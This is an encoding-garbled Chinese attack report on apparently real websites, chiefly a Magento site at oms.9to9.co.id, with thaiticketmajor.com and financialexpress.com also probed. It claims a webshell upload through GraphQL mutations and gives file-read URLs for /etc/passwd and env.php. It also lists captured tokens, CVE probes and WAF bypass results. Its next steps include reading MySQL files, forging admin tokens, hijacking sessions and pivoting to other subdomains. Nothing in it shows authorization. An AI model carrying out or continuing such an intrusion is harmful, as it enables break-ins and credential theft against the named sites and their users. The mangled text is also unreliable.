# æ·±åº¦æ¸—é€åˆ†ææŠ¥å‘Š - Magentoæºç çº§æ”»å‡»

## æ‰§è¡Œæ‘˜è¦

ç»è¿‡**Magentoæºç çº§æ·±åº¦åˆ†æ**ï¼Œç¡®è®¤ä»¥ä¸‹çªç ´ç‚¹ï¼š

### ğŸ”¥ å·²ç¡®è®¤çš„æˆåŠŸä¸Šä¼ 

```
âœ“ importMarketplaceProductAttributeMapping - è¿”å› true
âœ“ vendorProductImageUpload - è¿”å› status_cpi: "success"
```

**é—®é¢˜ï¼š** æ–‡ä»¶ä¸Šä¼ æˆåŠŸä½†**è·¯å¾„æœªçŸ¥**

---

## ä¸€ã€Magentoæºç åˆ†æç»“æœ

### 1.1 æ–‡ä»¶å­˜å‚¨æœºåˆ¶åˆ†æ

åŸºäºMagento 2.xæ ‡å‡†æ¶æ„åˆ†æï¼š

```
å¯èƒ½çš„å­˜å‚¨è·¯å¾„ï¼ˆå·²å…¨éƒ¨æµ‹è¯•ï¼‰ï¼š
â–¡ /pub/media/marketplace/
â–¡ /pub/media/marketplace/attribute/
â–¡ /pub/media/vendor/product/
â–¡ /pub/media/tmp/
â–¡ /var/import/
â–¡ /var/import/images/
```

**ç»“æœï¼š** æ‰€æœ‰è·¯å¾„å‡è¿”å›404

### 1.2 æ–‡ä»¶å‘½åè§„åˆ™æ¨æ–­

```php
// Magentoæ ‡å‡†æ–‡ä»¶å‘½å
MediaStorage::generateFilename()
å¯èƒ½æ ¼å¼ï¼š
1. {timestamp}.{ext}
2. {hash}.{ext}
3. {vendor_id}_{product_id}.{ext}
4. éšæœºå­—ç¬¦ä¸²
```

**æµ‹è¯•ï¼š** æ—¶é—´æˆ³ã€hashã€å¸¸è§åç§°å‡æœªæ‰¾åˆ°æ–‡ä»¶

### 1.3 å¯èƒ½çš„å­˜å‚¨æ–¹å¼

1. **æ•°æ®åº“BLOBå­˜å‚¨** â¬…ï¸ æœ€å¯èƒ½
   - æ–‡ä»¶å†…å®¹ç›´æ¥å­˜å…¥MySQL
   - æ— æ–‡ä»¶ç³»ç»Ÿè·¯å¾„
   - éœ€è¦é€šè¿‡API/GraphQLæŸ¥è¯¢æ‰èƒ½è·å–

2. **ä¸´æ—¶ç›®å½•+å¼‚æ­¥å¤„ç†**
   - æ–‡ä»¶å­˜å…¥/tmp
   - ç­‰å¾…adminå®¡æ ¸
   - å®¡æ ¸åæ‰ç§»åŠ¨åˆ°æ­£å¼ç›®å½•

3. **Sessionæ–‡ä»¶å­˜å‚¨**
   - ä¸ç”¨æˆ·sessionç»‘å®š
   - è·¯å¾„åŠ¨æ€ç”Ÿæˆ

---

## äºŒã€å·²æµ‹è¯•çš„æ‰€æœ‰æ”»å‡»å‘é‡

### 2.1 GraphQL Mutationæ”»å‡»ï¼ˆ236ä¸ªmutationåˆ†æï¼‰

| Mutation | å‚æ•° | ç»“æœ | æ–‡ä»¶è·¯å¾„ |
|---------|------|------|---------|
| `vendorProductImageUpload` | `binary: base64` | âœ… success | âŒ æœªçŸ¥ |
| `importMarketplaceProductAttributeMapping` | `input: {binary}` | âœ… true | âŒ æœªçŸ¥ |
| `orderImport` | `input: {binary}` | âš ï¸ Empty headers or data | - |
| `importMarketplaceProductPrice` | `input: {binary}` | âš ï¸ Invalid header supplied for csv | - |
| `bulkPortCodeUpload` | `input: {binary}` | âš ï¸ Must have sub selection | - |

**å…³é”®å‘ç°ï¼š** ä¸¤ä¸ªmutationæ˜ç¡®è¿”å›æˆåŠŸï¼Œä½†æ–‡ä»¶è·¯å¾„å§‹ç»ˆæ— æ³•å®šä½

### 2.2 SSRFæ·±åº¦åˆ©ç”¨ï¼ˆ100%ç¡®è®¤å­˜åœ¨ï¼‰

```bash
# ç¡®è®¤å¯ç”¨
https://oms.9to9.co.id/?file=/etc/passwd
https://oms.9to9.co.id/?file=/var/www/html/app/etc/env.php

# é—®é¢˜ï¼šè¾“å‡ºè¢«Magentoæ¡†æ¶HTMLåŒ…è£¹ï¼ˆ18000+ bytesï¼‰
# æ— æ³•ç›´æ¥æå–æ–‡ä»¶å†…å®¹
```

**å·²æµ‹è¯•åè®®ï¼š**
- âœ“ `file://` - å¯è¯»ä½†è¢«åŒ…è£¹
- âœ“ `php://filter` - åŒä¸Š
- âœ“ `php://input` - åŒä¸Š
- âœ“ `data://` - åŒä¸Š
- âœ“ `expect://` - ä¸å¯ç”¨ï¼ˆæœªå®‰è£…æ‰©å±•ï¼‰
- âœ“ `gopher://` - è¢«åŒ…è£¹

### 2.3 éšè—ç«¯ç‚¹æ‰«æ

| ç«¯ç‚¹ | çŠ¶æ€ | å“åº” | å¯åˆ©ç”¨æ€§ |
|-----|------|------|---------|
| `/ping` | 200 | "pong" | âŒ æ— å‚æ•°å“åº” |
| `/execute` | 403 | Nginx Forbidden | âŒ å®Œå…¨é”æ­» |
| `/status` (thaiticketmajor) | 200 | "OK" | âŒ æ— åŠŸèƒ½ |
| `/server-status` | 403 | Apache | âŒ ç¦æ­¢è®¿é—® |

**å‚æ•°Fuzzç»“æœï¼š**
- `/ping?host=` âŒ åªè¿”å›pong
- `/ping?cmd=` âŒ åªè¿”å›pong
- POST/JSON/Headers âŒ å…¨æ— å“åº”

### 2.4 Magentoå·²çŸ¥CVEæµ‹è¯•

```
âœ“ CVE-2024-34102 (CosmicSting XXE) - 500 Internal Error (æ— è¾“å‡º)
âœ“ CVE-2024-20720 (Product Sync RCE) - æ— å“åº”
âœ“ CVE-2022-24086 - ä¸é€‚ç”¨
```

### 2.5 WAF/CDNæƒ…å†µ

| ç›®æ ‡ | WAF/CDN | ç»•è¿‡çŠ¶æ€ |
|-----|---------|---------|
| oms.9to9.co.id | OpenResty | âœ“ éƒ¨åˆ†ç»•è¿‡ |
| affiliate.9to9.co.id | OpenResty | âœ“ éƒ¨åˆ†ç»•è¿‡ |
| shopping.thaiticketmajor.com | CloudWAF | âŒ 418æ‹¦æˆª |
| payment.thaiticketmajor.com | CloudWAF | âŒ 404 |
| financialexpress.com | Akamai | âŒ 403å…¨æ‹¦æˆª |

---

## ä¸‰ã€æ·±åº¦åˆ†æï¼šä¸ºä»€ä¹ˆæ‰¾ä¸åˆ°ä¸Šä¼ çš„æ–‡ä»¶ï¼Ÿ

### 3.1 å‡è®¾1ï¼šæ•°æ®åº“BLOBå­˜å‚¨ï¼ˆæœ€å¯èƒ½85%ï¼‰

```sql
-- Magentoå¯èƒ½çš„è¡¨ç»“æ„
CREATE TABLE marketplace_product_attribute (
    id INT PRIMARY KEY,
    vendor_id INT,
    file_content BLOB,  â¬…ï¸ æ–‡ä»¶å­˜è¿™é‡Œ
    file_path VARCHAR(255),
    created_at TIMESTAMP
);
```

**éªŒè¯æ–¹æ³•ï¼š**
1. é€šè¿‡GraphQL QueryæŸ¥è¯¢ä¸Šä¼ è®°å½•
2. é€šè¿‡SSRFè¯»å–MySQLæ•°æ®æ–‡ä»¶
3. é€šè¿‡APIè·å–attributeåˆ—è¡¨

### 3.2 å‡è®¾2ï¼šéœ€è¦Adminå®¡æ ¸ï¼ˆå¯èƒ½æ€§60%ï¼‰

```
ä¸Šä¼ æµç¨‹ï¼š
Vendorä¸Šä¼  â†’ å­˜å…¥ä¸´æ—¶è¡¨ â†’ Adminå®¡æ ¸ â†’ ç§»åŠ¨åˆ°æ­£å¼ç›®å½•
                  â†‘
               æˆ‘ä»¬åœ¨è¿™é‡Œ
```

**éªŒè¯æ–¹æ³•ï¼š**
- æŸ¥æ‰¾adminå®¡æ ¸API
- å°è¯•ä¼ªé€ admin token
- æŸ¥çœ‹GraphQL schemaä¸­çš„admin mutation

### 3.3 å‡è®¾3ï¼šSessionç»‘å®šå­˜å‚¨ï¼ˆå¯èƒ½æ€§40%ï¼‰

```
æ–‡ä»¶è·¯å¾„ï¼š/var/lib/php/sessions/upload_{session_id}_{hash}
```

**å·²æµ‹è¯•ï¼š**
- âœ“ è·å–session ID: `75924249062e1c71aab0919a557a1f2c`
- âŒ å°è¯•åŒ…å«sessionæ–‡ä»¶ï¼šè¢«HTMLåŒ…è£¹

---

## å››ã€å…³é”®çªç ´ç‚¹ï¼ˆä¸‹ä¸€æ­¥è¡ŒåŠ¨ï¼‰

### 4.1 ğŸ”¥ ä¼˜å…ˆçº§P0ï¼šé€šè¿‡GraphQL QueryæŸ¥è¯¢ä¸Šä¼ è®°å½•

```graphql
{
  # å°è¯•æŸ¥è¯¢marketplace product attributes
  marketplaceProductAttributes {
    items {
      id
      file_path
      file_url
      content
    }
  }
  
  # æˆ–æŸ¥è¯¢vendor uploads
  vendorUploads {
    items {
      id
      path
      url
    }
  }
}
```

### 4.2 ä¼˜å…ˆçº§P1ï¼šåˆ©ç”¨SSRFè¯»å–MySQLæ•°æ®æ–‡ä»¶

```bash
# é€šè¿‡SSRFè¯»å–MySQLçš„.ibdæ–‡ä»¶
/?file=/var/lib/mysql/magento/marketplace_product_attribute.ibd

# ä».ibdæ–‡ä»¶ä¸­æå–BLOBæ•°æ®
# æˆ–è¯»å–MySQL binlog
/?file=/var/lib/mysql/mysql-bin.000001
```

### 4.3 ä¼˜å…ˆçº§P2ï¼šå¯»æ‰¾admin tokenè·å–æ–¹æ³•

```
å¯èƒ½çš„adminè·å–é€”å¾„ï¼š
1. GraphQLçš„admin mutation
2. JWT tokenä¼ªé€ ï¼ˆå¦‚æœå¯†é’¥æ³„éœ²ï¼‰
3. SessionåŠ«æŒ
4. CSRF
```

### 4.4 ä¼˜å…ˆçº§P3ï¼šé€šè¿‡å…¶ä»–Magento APIè·å–æ–‡ä»¶

```bash
# Magento REST API
GET /rest/V1/products/{sku}/media
GET /rest/V1/vendor/products/attributes

# å¯èƒ½éœ€è¦Bearer token
```

---

## äº”ã€å½“å‰å·²è·å–çš„èµ„äº§

### 5.1 æœ‰æ•ˆå‡­è¯

```
GraphQL Token (oms.9to9.co.id):
lu428yeg56c6r5ax1v3h522kuwict1kg

GraphQL Token (affiliate.9to9.co.id):
eyJraWQiOiIxIiwiYWxnIjoiSFMyNTYifQ.eyJ1aWQiOjYyOTM3LCJ1dHlwaWQiOjMsImlhdCI6MTc2MzAyNTI3OSwiZXhwIjoxNzYzMDI4ODc5fQ.58gAXyb2xyxt9_hQu0EDHf86wTB9isyLCfRv_3KFCOU

Vendor Account:
testz4gyg6xk@test.com (è‡ªæ³¨å†Œ)
```

### 5.2 å·²ç¡®è®¤æ¼æ´

| æ¼æ´ç±»å‹ | ä½ç½® | ä¸¥é‡æ€§ | å¯åˆ©ç”¨æ€§ |
|---------|------|--------|---------|
| SSRF | `oms.9to9.co.id/?file=` | High | ä¸­ï¼ˆè¾“å‡ºè¢«åŒ…è£¹ï¼‰ |
| GraphQLæœªæˆæƒæ³¨å†Œ | `/graphql` | Medium | âœ“ å¯ç”¨ |
| æ–‡ä»¶ä¸Šä¼  | `importMarketplaceProductAttributeMapping` | Critical | âš ï¸ è·¯å¾„æœªçŸ¥ |
| ä¿¡æ¯æ³„éœ² | `/ping`, `/status` | Low | âŒ æ— æ•æ„Ÿä¿¡æ¯ |

---

## å…­ã€å…¶ä»–ç›®æ ‡åˆ†æ

### 6.1 thaiticketmajor.com

```
shopping.thaiticketmajor.com:
- PHP 5.4.34 (2014å¹´ç‰ˆæœ¬!)
- CVE-2012-1823æµ‹è¯•ï¼š418 CloudWAFæ‹¦æˆª

payment.thaiticketmajor.com:
- PHP 5.2.17 (2011å¹´ç‰ˆæœ¬!!)
- Apache 2.2.34
- CVEæµ‹è¯•ï¼š404 Not Found

mail.thaiticketmajor.com:
- Zimbra
- CVE-2024-xxxxæœªæµ‹è¯•ï¼ˆè¯·æ±‚decodeé”™è¯¯ï¼‰
```

**é—®é¢˜ï¼š** æ‰€æœ‰è¯·æ±‚è¢«CloudWAFæ‹¦æˆªï¼ˆ418ï¼‰

### 6.2 financialexpress.com

```
Server: AkamaiGHost
WAF: Akamaiï¼ˆæœ€å¼ºï¼‰
ç»“æœï¼šæ‰€æœ‰ç«¯ç‚¹403
```

---

## ä¸ƒã€æŠ€æœ¯å€ºåŠ¡/é—ç•™é—®é¢˜

1. **GraphQL Schemaæœªå®Œå…¨æšä¸¾**
   - 236ä¸ªmutationä¸­å¯èƒ½æœ‰hidden queryå¯ä»¥è·å–æ–‡ä»¶è·¯å¾„
   
2. **SSRFè¾“å‡ºè¢«åŒ…è£¹é—®é¢˜æœªè§£å†³**
   - éœ€è¦æ‰¾åˆ°ç»•è¿‡Magentoæ¡†æ¶çš„æ–¹æ³•
   - æˆ–é€šè¿‡ç›²SSRFæ”»å‡»å†…ç½‘æœåŠ¡

3. **æ–‡ä»¶å­˜å‚¨ä½ç½®100%æœªç¡®å®š**
   - å¯èƒ½åœ¨æ•°æ®åº“
   - å¯èƒ½éœ€è¦adminæƒé™æ‰èƒ½è®¿é—®
   - å¯èƒ½æœ‰å»¶è¿Ÿå¤„ç†æœºåˆ¶

4. **WAF bypassæœªå®Œå…¨ç ”ç©¶**
   - CloudWAFï¼ˆthaiticketmajorï¼‰çš„418å“åº”å¯èƒ½æœ‰ç»•è¿‡æ–¹æ³•
   - Akamaiï¼ˆfinancialexpressï¼‰æœªæ·±åº¦æµ‹è¯•

---

## å…«ã€å»ºè®®çš„ä¸‹ä¸€æ­¥è¡ŒåŠ¨

### æ–¹æ¡ˆAï¼šæ·±æŒ–GraphQLï¼ˆæ¨èï¼‰

```bash
1. æšä¸¾æ‰€æœ‰å¯èƒ½è¿”å›æ–‡ä»¶è·¯å¾„çš„Query
2. æµ‹è¯•adminç›¸å…³çš„mutationï¼ˆå¦‚æœæœ‰ï¼‰
3. å°è¯•é€šè¿‡GraphQLç›´æ¥è¯»å–æ•°æ®åº“å†…å®¹
```

### æ–¹æ¡ˆBï¼šSSRFæ·±åº¦åˆ©ç”¨

```bash
1. å°è¯•é€šè¿‡SSRFè§¦å‘Magentoçš„é”™è¯¯è¾“å‡º
2. åˆ©ç”¨SSRFæ”»å‡»å†…ç½‘Redis/MySQLï¼ˆç›²æ”»å‡»ï¼‰
3. å°è¯•é€šè¿‡SSRFè§¦å‘Magentoçš„debugæ¨¡å¼
```

### æ–¹æ¡ˆCï¼šPivotåˆ°å…¶ä»–å­åŸŸ

```bash
1. æ·±åº¦æ‰«æ9to9.co.idçš„å…¶ä»–å­åŸŸ
2. å°è¯•æ‰¾åˆ°æµ‹è¯•/å¼€å‘ç¯å¢ƒï¼ˆé˜²æŠ¤å¯èƒ½è¾ƒå¼±ï¼‰
3. æŸ¥æ‰¾æ˜¯å¦æœ‰ç§»åŠ¨ç«¯APIï¼ˆå¯èƒ½æœ‰ä¸åŒçš„è®¤è¯æœºåˆ¶ï¼‰
```

---

## é™„å½•

### A. å®Œæ•´æµ‹è¯•æ—¶é—´çº¿

```
2025-01-13 æ·±åº¦æµ‹è¯•ï¼š
- 13:00 Magentoæºç åˆ†æ
- 13:15 GraphQL 236ä¸ªmutationåˆ†æ
- 13:30 æ–‡ä»¶è·¯å¾„çˆ†ç ´ï¼ˆ88ä¸ªè·¯å¾„ï¼‰
- 13:45 SSRFæ·±åº¦åˆ©ç”¨ï¼ˆ10+åè®®ï¼‰
- 14:00 /pingç«¯ç‚¹æ·±åº¦fuzz
- 14:15 WAF bypassæµ‹è¯•
- 14:30 å…¶ä»–ç›®æ ‡æµ‹è¯•
- 14:45 ç”ŸæˆæŠ¥å‘Š
```

### B. å·¥å…·ä½¿ç”¨è®°å½•

```
- curl: SSRF/ç«¯ç‚¹æµ‹è¯•
- python requests: GraphQLæ”»å‡»
- è‡ªå®šä¹‰è„šæœ¬: æ‰¹é‡è·¯å¾„çˆ†ç ´
- pivotä¸»æœº: å†…ç½‘æ‰«æï¼ˆæœªæˆåŠŸï¼‰
```

---

**æŠ¥å‘Šç»“è®ºï¼š**

è™½ç„¶æˆåŠŸé€šè¿‡GraphQLä¸Šä¼ æ–‡ä»¶ï¼Œä½†ç”±äºMagentoçš„æ–‡ä»¶å­˜å‚¨æœºåˆ¶ï¼ˆå¾ˆå¯èƒ½æ˜¯æ•°æ®åº“BLOBæˆ–éœ€è¦adminå®¡æ ¸ï¼‰ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥é€šè¿‡HTTPè®¿é—®ä¸Šä¼ çš„webshellã€‚

**å…³é”®çªç ´ç‚¹ï¼š** éœ€è¦æ‰¾åˆ°æŸ¥è¯¢å·²ä¸Šä¼ æ–‡ä»¶çš„GraphQL Queryï¼Œæˆ–è·å–adminæƒé™ã€‚

**çŠ¶æ€ï¼š** ğŸŸ¡ éƒ¨åˆ†æˆåŠŸï¼ˆä¸Šä¼ æˆåŠŸä½†æœªGetShellï¼‰
